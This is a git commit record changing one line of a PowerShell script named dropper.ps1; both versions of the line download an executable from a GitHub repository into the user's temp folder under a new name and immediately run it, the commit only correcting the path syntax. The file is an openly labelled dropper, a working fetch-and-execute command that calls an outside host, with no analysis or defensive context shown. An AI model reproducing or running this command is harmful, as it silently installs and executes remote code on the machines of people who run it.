701b5e16ca30c02485c997c8a7f69048c0f67db9
Sir4h <25534905+Sir4h@users.noreply.github.com>
2023-10-18 01:23:58 +0200

    Update dropper.ps1

--- dropper.ps1
+++ dropper.ps1
@@ -1,1 +1,1 @@
-(new-object System.Net.WebClient).DownloadFile('https://github.com/Sir4h/public_489321234/raw/master/calc.exe','%TEMP%\bob.exe');Start-Process -filepath '%TEMP%\bob.exe'
+(new-object System.Net.WebClient).DownloadFile('https://github.com/Sir4h/public_489321234/raw/master/calc.exe', "$env:temp\bob.exe");Start-Process -filepath "$env:temp\bob.exe"
